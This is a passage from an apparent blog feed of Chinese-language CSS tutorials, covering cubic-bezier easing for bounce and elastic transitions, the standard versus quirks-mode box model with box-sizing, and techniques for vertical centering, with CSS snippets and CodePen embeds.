class="line">&#125;</span><br></pre></td></tr></table></figure><p>相信我们都做过这样的事，但是我们跑一遍这个动画，会发现它显示的及其不真实，主要原因在于，每当这个小球方向改变时，她得移动过程都是持续加速的，这看起来很不自然。<code>原因其实就是因为它的调速函数在关键帧的衔接都是一样的</code></p><p>所有的过渡和动画之间都是跟一条曲线有关的，<code>这条曲线指定了动画过程在整段时间中是如何推进的</code>。</p><p>如果不指定调速函数，就是得到一个默认值。但是这个<code>默认值</code>并不是我们想象中的匀速效果，而是：</p><p><img src="http://www.chenqaq.com/assets/images/easing2.png" alt="默认值"></p><p>注意，当时间进行到一半时，这个过渡已经推进到80%.</p><p>说到<code>调速函数</code>,我们很自然联系到了css内置的缓动曲线和贝塞尔曲线。</p><p>不论是在<code>animation/transition</code>简写属性中，还是在<code>animation-timing-function/transition-timing-function</code>展开属性中，你都可以把这个默认的调速函数显示指定<code>ease</code>关键字。除了ease外，还有四种内置的缓动曲线，你可以借助他们来改变动画的推进方式</p><p><img src="http://www.chenqaq.com/assets/images/easing-easeOut.png" alt="ease-out"><br><img src="http://www.chenqaq.com/assets/images/easing-easeIn.png" alt="ease-in"></p><p><img src="http://www.chenqaq.com/assets/images/easing-easeInOut.png" alt="ease-in-out"><br><img src="/images/placeholder.png" alt="linear" data-src="http://www.chenqaq.com/assets/images/easing3.png" class="lazyload"></p><p>从上面四个图中，我们很直观的看出，<code>ease-out</code>是<code>ease-in</code>的反向版本。而这一对组合正是实现回弹效果所需要的：<code>每当小球的运动方向相反时，我们希望调速函数也是相反的</code>。我们希望小球下落是加速的<code>(ease-out)</code>,而弹起向上是减速的<code>(ease-in)</code>:</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">@<span class="keyword">keyframes</span> bounce&#123;</span><br><span class="line">    60%,80%,<span class="selector-tag">to</span>&#123;</span><br><span class="line">        <span class="attribute">transform</span>:<span class="built_in">translateY</span>(400px);</span><br><span class="line">        <span class="attribute">animation-timing-function</span>:ease-out;</span><br><span class="line">    &#125;</span><br><span class="line">    70%&#123;<span class="attribute">transform</span>:<span class="built_in">translateY</span>(300px);&#125;</span><br><span class="line">    90%&#123;<span class="attribute">transform</span>:<span class="built_in">translateY</span>(360px);&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.ball</span>&#123;</span><br><span class="line">    <span class="attribute">animation</span>:bounce <span class="number">3s</span> ease-in;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然我们改动不大，但是已经发现回弹效果变得真实起来。不过显然这<code>五种内置的缓动曲线</code>是不够用的，假如我们这个回弹效果是用来模拟自由落体的，那么我们需要一个<code>更高的加速度</code>和ease的反向版本，又如何得到呢？</p><p>其实所有的这五种曲线都是通过<code>(三次)贝塞尔曲线</code>来指定的，而CSS的调速函数都是<code>只有一个片段的贝塞尔曲线</code>，每个函数也只有两个控制锚点，CSS就提供了一个<code>cubic-bezier()</code>函数，允许我们指定自定义调速函数。他接受四个参数，分别是两个控制锚点的坐标值，<br><code>cubic-bezier(x1,y1,x2,y2)</code>，曲线的两个端点固定在(0,0)和(1,1)之间，前者是整个过渡的起点(时间进度0%，动画进度0%)而后者是整个过渡的终点(时间进度100%，动画进度100%)。</p><p>举例来说，<code>ease</code>等同于<code>cubic-bezier(.25,.1,.25,1)</code>,因此它的反向版本就是<code>cubic-bezier(.1,.25,1,.25)</code></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">@<span class="keyword">keyframes</span> bounce&#123;</span><br><span class="line">    60%,80%,<span class="selector-tag">to</span>&#123;</span><br><span class="line">        <span class="attribute">transform</span>:<span class="built_in">translateY</span>(400px);</span><br><span class="line">        <span class="attribute">animation-timing-function</span>:ease;</span><br><span class="line">    &#125;</span><br><span class="line">    70%&#123;</span><br><span class="line">        <span class="attribute">transform</span>:<span class="built_in">translateY</span>(300PX);</span><br><span class="line">    &#125;</span><br><span class="line">    90%&#123;</span><br><span class="line">        <span class="attribute">transform</span>:<span class="built_in">translateY</span>(160px);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.ball</span>&#123;</span><br><span class="line">    <span class="attribute">animation</span>:bounce <span class="number">3s</span> <span class="built_in">cubic-bezier</span>(.1,.25,1,.25);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><iframe height="265" scrolling="no" title="css-animation-easing" src="//codepen.io/okaychen/embed/xPveBP/?height=265&theme-id=dark&default-tab=css,result&embed-version=2" frameborder="no" allowtransparency="true" allowfullscreen="true" style="width: 100%;margin-top:20px">See the Pen <a href="https://codepen.io/okaychen/pen/xPveBP/" target="_blank" rel="noopener">css-animation-easing</a> by okaychen (<a href="https://codepen.io/okaychen" target="_blank" rel="noopener">@okaychen</a>) on <a href="https://codepen.io" target="_blank" rel="noopener">CodePen</a>.<br></iframe><p>我们可以借助<a href="http://cubic-bezier.com" target="_blank" rel="noopener">cubic-bezier.com</a>的图形化工具，进行反复尝试和优化，从而进一步改写这个回弹动画.</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>经过以上这些知识的学习储备和练习，相信我们已经可以做出很棒的弹跳动画了.<br>我们在文章开始放了一个小球弹跳的gif图效果，那么就让我们真真正正的动手来写一下吧！</p><p></p><p data-height="265" data-theme-id="dark" data-slug-hash="POMgrv" data-default-tab="css,result" data-user="okaychen" data-embed-version="2" data-pen-title="css-animation-easing-practice" class="codepen">See the Pen <a href="https://codepen.io/okaychen/pen/POMgrv/" target="_blank" rel="noopener">css-animation-easing-practice</a> by okaychen (<a href="https://codepen.io/okaychen" target="_blank" rel="noopener">@okaychen</a>) on <a href="https://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p><p></p><script async src="https://production-assets.codepen.io/assets/embed/ei.js"></script><h1 id="弹性过渡"><a href="#弹性过渡" class="headerlink" title="弹性过渡"></a>弹性过渡</h1><p>假设我们有一个文本输入框，每当它被聚焦时，都需要展示一个提示框<br>我们有如下结构：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br><span class="line">    Your username:<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"username"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"callout"</span>&gt;</span>Only letters,numbers,usrescore(_) and hyphens (-) allowed!<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>每当用户聚焦这个文本输入框时，都会有一个半秒钟的过渡，可能我们会完成这样的代码<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-pseudo">:not(</span><span class="selector-pseudo">:focus)</span> + <span class="selector-class">.callout</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>:<span class="built_in">scale</span>(0);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.callout</span>&#123;</span><br><span class="line">    <span class="attribute">transition</span>:.<span class="number">5s</span> transform;</span><br><span class="line">    <span class="attribute">transition-origin</span>:<span class="number">1.4em</span> -.<span class="number">4em</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个过渡没有任何问题，但是我们希望它在结尾时能在夸张一点话，显得更加自然生动，我们可能会把这个过渡改为一个动画，然后用上面提到的缓动曲线<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">@<span class="keyword">keyframes</span> elastic-grow&#123;</span><br><span class="line">    <span class="selector-tag">from</span>&#123;<span class="attribute">transform</span>:<span class="built_in">scale</span>(0);&#125;</span><br><span class="line">    70% &#123;</span><br><span class="line">        <span class="attribute">transform</span>:<span class="built_in">scale</span>(1.1);</span><br><span class="line">        <span class="attribute">animation-timing-function</span>:<span class="built_in">cubic-bezier</span>(.1,.25,1,.25);   <span class="comment">/*反向的ease*/</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">input</span><span class="selector-pseudo">:not(</span><span class="selector-pseudo">:focus)</span> + <span class="selector-class">.callout</span>&#123; <span class="attribute">transform</span>:<span class="built_in">scale</span>(0); &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">input</span><span class="selector-pseudo">:focus</span> + <span class="selector-class">.callout</span>&#123; <span class="attribute">animation</span>:elastic-grow .<span class="number">5s</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.callout</span>&#123; <span class="attribute">transform-origin</span>:<span class="number">1.4em</span> -.<span class="number">4em</span>; &#125;</span><br></pre></td></tr></table></figure></p><p>添加了这个动画之后，确实发挥了作用。不过这里我们其实只是需要一个过渡而已，而我们本质上却使用了一个动画，显得有些大材小用，有一种杀鸡用牛刀的感觉，我们如何只用过渡完成这个效果呢？</p><p>这里我们就用到了上面说起的调速函数<code>cubic-bezier()</code>，在这个例子中，我们希望调速函数先到达110%的程度(相当于<code>scale(1.1)</code>)，然后在过渡回100%，我们把控制锚点向上移，</p><p><img src="/images/placeholder.png" alt="cubic-bezier(.25,.1,.3,1.5)" data-src="http://www.chenqaq.com/assets/images/Tankease.png" class="lazyload"></p><p>这个自定义调速函数在垂直坐标上已经超出0~1的区间，最终又回到1，在70%的时间点到达了110%的变形程度的高峰，然后继续用剩下30%的时间回到它的最终值</p><p>整个过渡的推进，非常接近前面的动画方案，但他仅需要一行代码就可以实现整个效果<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-pseudo">:not(</span><span class="selector-pseudo">:focus)</span> + <span class="selector-class">.callout</span>&#123; <span class="attribute">transform</span>:<span class="built_in">scale</span>(0) &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.callout</span>&#123;</span><br><span class="line">    <span class="attribute">transform-origin</span>:<span class="number">1.4em</span> -.<span class="number">4em</span>;</span><br><span class="line">    <span class="attribute">transition</span>:.<span class="number">5s</span> <span class="built_in">cubic-bezier</span>(.25,.1,.3,1.5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/images/placeholder.png" alt="cubic-bezier(.25,.1,.3,1.5)" data-src="http://www.chenqaq.com/assets/images/Tankbug.png" class="lazyload"></p><p>but,wait…当提示框收缩时，左下角出现的是什么？其实，当我们把焦点从输入框切出去的时候，所触发的过渡会以<code>scale(1)</code>作为起始值，并以<code>scale(0)</code>作为最终值，这个过渡仍然会在350ms后到达110%的变形程度。只不过在这里，110%的变形程度的解析结果并不是<code>scale(1.1)</code>,而是scale<code>(-0.1)</code></p><p>我们可以定义关闭状态的css规则(假如我们指定普通的ease调速函数)把当前的调速函数覆盖掉<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-pseudo">:not(</span><span class="selector-pseudo">:focus)</span> + <span class="selector-class">.callout</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>:<span class="built_in">scale</span>(0);</span><br><span class="line">    <span class="attribute">transition-timing-function</span>:ease;   <span class="comment">/*覆盖cubic-bezier*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.callout</span>&#123;</span><br><span class="line">    <span class="attribute">transform-origin</span>:<span class="number">1.4em</span> -.<span class="number">4em</span>;</span><br><span class="line">    <span class="attribute">transition</span>:.<span class="number">5s</span> <span class="built_in">cubic-bezier</span>(.25,.1,.3,1.5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>再试一试，发现已经关闭提示框已经恢复到我们设置<code>cubic-bezier()</code>之前的样子了，</p><p>但是其实我们仔细观察发现另一个问题：<code>提示框的关闭动作明显要迟钝一些。</code>我们细细想来发现，在提示框展开过程中，当时间为50%(250ms)时，它就已经到达100%的尺寸效果了。但是在收缩过程中，从0%~100%的变化会花费我们为过渡所指定的素有时间(500ms),因此感觉会慢上一般</p><p>然后我们会想到同时覆盖过渡的持续时间：可以用<code>transition-duration</code>这一属性，也可以用<code>transition</code>这个简写属性来覆盖所有值，如果选择后者的话就不需要指定ease了，因为他本来就是<code>transition</code>的初始值:</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-pseudo">:not(</span><span class="selector-pseudo">:focus)</span> + <span class="selector-class">.callout</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>:<span class="built_in">scale</span>(0);</span><br><span class="line">    <span class="attribute">transition</span>:.<span class="number">25s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.callout</span>&#123;</span><br><span class="line">    <span class="attribute">transform-origin</span>:<span class="number">1.4em</span> -.<span class="number">4em</span>;</span><br><span class="line">    <span class="attribute">transition</span>:.<span class="number">5s</span> <span class="built_in">cubic-bezier</span>(.25,.1,.3,1.5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><iframe height="265" scrolling="no" title="css-animation-task" src="//codepen.io/okaychen/embed/VywaXV/?height=265&theme-id=dark&default-tab=css,result&embed-version=2" frameborder="no" allowtransparency="true" allowfullscreen="true" style="width: 100%;margin-top:20px">See the Pen <a href="https://codepen.io/okaychen/pen/VywaXV/" target="_blank" rel="noopener">css-animation-task</a> by okaychen (<a href="https://codepen.io/okaychen" target="_blank" rel="noopener">@okaychen</a>) on <a href="https://codepen.io" target="_blank" rel="noopener">CodePen</a>.<br></iframe><h2 id="最后-1"><a href="#最后-1" class="headerlink" title="最后"></a>最后</h2><p>虽然弹性过渡在很多过渡中都可以收到不错的效果，但是某些时候<code>他产生的效果可能相当糟糕</code>。典型的<code>反面案例</code>出现在对<code>颜色属性</code>的弹性过渡中。尽管颜色发生弹性过渡可能非常有趣，但这种效果在UI场景中通常是不合适的.</p><p>为了避免不小心对颜色设置了弹性过渡，可以尝试把<code>过渡的作用范围限制在某几种特定的属性上</code>，transition不指定时，<code>transition-property</code>就会得到它的初始值：<code>all</code>，这意味着只要是过渡的属性都会参与过渡。我们可以在<code>transition</code>中设置<code>transform</code></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-pseudo">:not(</span><span class="selector-pseudo">:focus)</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>:<span class="built_in">scale</span>(0);</span><br><span class="line">    <span class="attribute">transition</span>:.<span class="number">25s</span> transform;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.callout</span>&#123;</span><br><span class="line">    <span class="attribute">transition-origin</span>:<span class="number">1.4em</span> -.<span class="number">4em</span>;</span><br><span class="line">    <span class="attribute">transform</span>:.<span class="number">5s</span> <span class="built_in">cubic-bezier</span>(.25,.1,.3,1.5) transform;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考资料</p><ul><li><p><a href="https://book.douban.com/subject/26295140/" target="_blank" rel="noopener">《CSS Secrets 》</a></p></li><li><p><a href="http://easings.net/zh-cn" target="_blank" rel="noopener">http://w3.org/TR/css-animations</a></p></li><li><p><a href="http://easings.net/zh-cn" target="_blank" rel="noopener">http://cubic-bezier.com</a></p></li><li><p><a href="http://easings.net/zh-cn" target="_blank" rel="noopener">understand css cubic-bezier</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> HTML/CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> animation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>css标准盒模型、怪异模式&amp;&amp;box-sizing属性</title>
      <link href="/2017/12/09/css-box-model/"/>
      <url>/2017/12/09/css-box-model/</url>
      
        <content type="html"><![CDATA[<h1 id="盒模型"><a href="#盒模型" class="headerlink" title="盒模型"></a>盒模型</h1><h2 id="DTD规范"><a href="#DTD规范" class="headerlink" title="DTD规范"></a>DTD规范</h2><p>盒模型分为：标准w3c盒模型、IE盒模型、以及css中的伸缩盒模型</p><p>当我们使用编辑器创建一个html页面时，我们一定会发现最顶上的<code>DOCTYPE</code>标签<br><a id="more"></a><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE HTML&gt;</span></span><br></pre></td></tr></table></figure></p><blockquote><p>上面这些doctype都是标准的文档类型，无论我们使用哪种模式都会触发标准模式，而如果doctype缺失，则在ie6、ie7、ie8将会触发怪异模式(quirks);</p></blockquote><p>一旦为页面设置了恰当的<code>DTD(文档定义类型)</code>,大多数浏览器都会按照标准盒模型来呈现内容，但是ie5和ie6的呈现却是不正确的.</p><p>根据w3c规范，元素内容占据空间是由<code>width</code>属性设置的，而内容周围的padding和border都是另外计算的。</p><p>不幸的是，IE5.X 和 6 在怪异模式中使用自己的非标准模型。这些浏览器的 width 属性不是内容的宽度，而是内容、内边距和边框的宽度的总和。</p><h2 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h2><p>我们用一个div块来演示标准模式和怪异模式的区别：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">border</span>:<span class="number">20px</span> solid black;</span><br><span class="line">    <span class="attribute">padding</span>:<span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">margin</span>:<span class="number">50px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="标准盒模型"><a href="#标准盒模型" class="headerlink" title="标准盒模型"></a>标准盒模型</h3><p>在标准模式下的盒模型如下图所示，盒子总宽度/高度=width/height+padding+border+margin</p><p><img src="http://www.chenqaq.com/assets/images/box-model1.png" alt="标准盒模型"></p><h3 id="怪异模式"><a href="#怪异模式" class="headerlink" title="怪异模式"></a>怪异模式</h3><p>在怪异模式下的盒模型如下图所示，盒子的总宽度和高度是包含内边距padding和边框border宽度在内的</p><p>盒子总宽度/高度=width/height + margin = width/height + margin;</p><p><img src="http://www.chenqaq.com/assets/images/box-model2.png" alt="怪异盒模型"></p><h1 id="CSS3的box-sizing属性"><a href="#CSS3的box-sizing属性" class="headerlink" title="CSS3的box-sizing属性"></a>CSS3的box-sizing属性</h1><p>语法：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">box-sizing : content-box || border-box || inherit;</span><br></pre></td></tr></table></figure><ul><li>当设置为content-box时，将采取标准模式进行解析计算</li><li>当设置为border-box时，将采取怪异模式解析计算</li></ul>]]></content>
      
      
      <categories>
          
          <category> HTML/CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> layout </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>把所有的东西都对齐吧！</title>
      <link href="/2017/12/07/css-verticalMiddle/"/>
      <url>/2017/12/07/css-verticalMiddle/</url>
      
        <content type="html"><![CDATA[<blockquote><p>“44年前我们就把人类送上了月球了，但现在我们仍然无法在css中实现垂直居中  -James Anderson”</p></blockquote><h1 id="难题"><a href="#难题" class="headerlink" title="难题"></a>难题</h1><p>在CSS中对元素进行水平居中是非常简单的；<code>如果是一个行内元素，就对父元素设置text-align:center；如果是一个它是一个块级元素，就对自身应用margin:auto.</code>然而考虑到代码的DRY和较强的可维护性，如果要对一个元素进行垂直居中，可能是令人头皮发麻的一件事情了.<br><a id="more"></a><br>就这样在前端开发圈内看似及其常见的需求，从理论上似乎极其简单，在实践中，它往往难如登天，当涉及尺寸不固定的元素时尤为如此.</p><p>为了解决这一”绝世难题”，于是前端开发者们殚精竭虑，脑洞大开，琢磨出了各种解决方案，大多数并不实用.</p><p>一路走来走了不少弯路，希望初入前端的小伙伴们可以走的更加通畅，总结分享给大家：</p><p>下面就让我们来探索现代css的强大威力：</p><h1 id="基于表格布局法的解决方案"><a href="#基于表格布局法的解决方案" class="headerlink" title="基于表格布局法的解决方案"></a>基于表格布局法的解决方案</h1><p>利用表格的显示模式，需要用到一些冗余的HTML元素</p><p>思路来源：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"width:100%;height:100%;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">td</span> <span class="attr">style</span>=<span class="string">"text-align: center; vertical-align: middle;"</span>&gt;</span></span><br><span class="line">          Unknown stuff to be centered.</span><br><span class="line">     <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">html</span>,<span class="selector-tag">body</span>&#123;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>摘自：<a href="https://css-tricks.com/centering-in-the-unknown/" target="_blank" rel="noopener">https://css-tricks.com/centering-in-the-unknown/</a></p><p>我们发现在table中vertical-align: middle；实现了自动垂直居中.</p><p>基于曾经在网页早期风靡一时的表格布局法：实现了垂直居中</p><iframe height="341" scrolling="no" title="xPNopE" src="//codepen.io/okaychen/embed/xPNopE/?height=341&theme-id=dark&default-tab=js,result&embed-version=2" frameborder="no" allowtransparency="true" allowfullscreen="true" style="width: 100%;margin-top:20px;">See the Pen <a href="https://codepen.io/okaychen/pen/xPNopE/" target="_blank" rel="noopener">xPNopE</a> by okaychen (<a href="https://codepen.io/okaychen" target="_blank" rel="noopener">@okaychen</a>) on <a href="https://codepen.io" target="_blank" rel="noopener">CodePen</a>.<br></iframe><p>但是由于表格布局法逐渐的退出舞台，这种方法也渐渐的不为所用</p><h1 id="基于绝对定位的解决方案"><a href="#基于绝对定位的解决方案" class="headerlink" title="基于绝对定位的解决方案"></a>基于绝对定位的解决方案</h1><p>早期实现垂直居中方法，要求具有固定的宽度和高度：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">main</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>:absolute;</span><br><span class="line">    <span class="attribute">top</span>:<span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">left</span>:<span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">magin-top</span>:-<span class="number">3em</span>;</span><br><span class="line">    <span class="attribute">margin-left</span>:-<span class="number">9em</span>;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">18em</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">6em</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这种方法利用负外边距移动的方法，从而把元素放在视口的正中心.我们还可以借助强大的<code>calc</code>函数，省掉两行声明：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">main</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>:absolute;</span><br><span class="line">    <span class="attribute">top</span>:<span class="built_in">calc</span>(50%-3em);</span><br><span class="line">    <span class="attribute">left</span>:<span class="built_in">calc</span>(50%-9em);</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">18em</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">6em</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>显然这个方法最大的局限性就是他要求元素具有固定宽度和高度.我们知道在通常情况下，固定宽度和高度的情况是极少的，对于那些需要居中的元素来说，其尺寸往往是由其内容决定的.如果能够找到一个属性的百分比以元素自身的宽高作为基准，那么难题就迎刃而解！遗憾的是，<code>对于大多数的css属性（包括margin）来说，百分比都是以其父元素的尺寸为基准进行解析的</code>.</p><p>css领域有一个很常见的现象，真正的解决方案往往来自我们最意想不到的地方：利用css变形属性，</p><blockquote><p>当我们在进行<code>translate（）</code>变形函数中使用百分比值时，是<code>以这个元素位基准进行转换和移动的</code>，而这正是我们所需要的.</p></blockquote><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">main</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>:absolute;</span><br><span class="line">    <span class="attribute">top</span>:<span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">left</span>:<span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">transform</span>:<span class="built_in">translate</span>(-50%,-50%);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><iframe height="265" scrolling="no" title="css-lineCenter-position" src="//codepen.io/okaychen/embed/NwQyRN/?height=265&theme-id=dark&default-tab=css,result&embed-version=2" frameborder="no" allowtransparency="true" allowfullscreen="true" style="width: 100%;margin-top:20px;">See the Pen <a href="https://codepen.io/okaychen/pen/NwQyRN/" target="_blank" rel="noopener">css-lineCenter-position</a> by okaychen (<a href="https://codepen.io/okaychen" target="_blank" rel="noopener">@okaychen</a>) on <a href="https://codepen.io" target="_blank" rel="noopener">CodePen</a>.<br></iframe><p>从codepen中看到，利用css变形技巧，这个容器已经完美居中，满足我们的期望.</p><p>但是没有任何技巧十全十美，我们需要注意几点：</p><ul><li><p>我们有时不能选择决定定位，他对整个布局影响太过强烈</p></li><li><p>如果需要居中的元素已经在高度上超过了视口，那它的顶部部分就会被视口裁掉</p></li><li><p>在某些浏览器中，这个方法可能会导致元素的显示模糊，因为元素可能会被放置在半个元素上.可以用一个偏hack的手段来修复<code>transform-style:preserve-3d</code></p></li></ul><h1 id="基于视口的解决方案"><a href="#基于视口的解决方案" class="headerlink" title="基于视口的解决方案"></a>基于视口的解决方案</h1><p>假设我们不使用绝对定位，仍然采用<code>translate()</code>技巧来把这个元素以其自身宽高的一半为距离进行移动；但是在缺少left和top的情况下，如何吧这个元素放在容器正中心呢？</p><p>我们的第一反应很可能用margin属性的百分比值来实现，就像这样：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">main</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">18em</span>;</span><br><span class="line">    <span class="attribute">padding</span>:<span class="number">1em</span> <span class="number">1.5em</span>;</span><br><span class="line">    <span class="attribute">margin</span>:<span class="number">50%</span> auto <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">transform</span>:<span class="built_in">translateY</span>(-50%);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>但是却产生了十分离谱的效果.原因在于<code>margin的百分比值是以父元素的宽度作为解析基准的</code></p><p>在CSS值与单位（第三版）定义了一套新的单位，称为视口相关的长度单位</p><ul><li><p>vm是与视口宽度相关的.1vm相当于视口的1%</p></li><li><p>与vw类似，1vh相当于视口的1%</p></li><li><p>当视口宽度小于高度时，1vmin等于1vw，否则等于1vh</p></li><li><p>当视口宽度大于高度时，1vmax等于1vw，否则等于1vh</p></li></ul><p>在这个例子中，我们适用外边距的是vh单位<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">main</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">18em</span>;</span><br><span class="line">    <span class="attribute">padding</span>:<span class="number">1em</span>  <span class="number">1.5em</span>;</span><br><span class="line">    <span class="attribute">margin</span>:<span class="number">50vh</span> auto <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">transform</span>:<span class="built_in">translateY</span>(-50%);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><iframe height="265" scrolling="no" title="css-lineCenter-vm" src="//codepen.io/okaychen/embed/NwQydr/?height=265&theme-id=dark&default-tab=css,result&embed-version=2" frameborder="no" allowtransparency="true" allowfullscreen="true" style="width: 100%;margin-top:20px">See the Pen <a href="https://codepen.io/okaychen/pen/NwQydr/" target="_blank" rel="noopener">css-lineCenter-vm</a> by okaychen (<a href="https://codepen.io/okaychen" target="_blank" rel="noopener">@okaychen</a>) on <a href="https://codepen.io" target="_blank" rel="noopener">CodePen</a>.<br></iframe><p>我们可以看到，其效果堪称完美.这个技巧更适合于在视口中居中的场景.</p><h1 id="基于Flexbox的解决方案"><a href="#基于Flexbox的解决方案" class="headerlink" title="基于Flexbox的解决方案"></a>基于Flexbox的解决方案</h1><p>这是毋庸置疑的最佳解决方案，因为Flexbox（伸缩盒）是专门针对这类需求所设计的.现代浏览器对于Flexbox支持度已经相当不错了</p><p>我们只需要两行声明即可：先给这个待定居中元素的父元素设置<code>display:flex</code>（在使用的例子中是body元素），在给这个元素设置我们在熟悉不过的<code>margin:auto</code><br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>:flex;</span><br><span 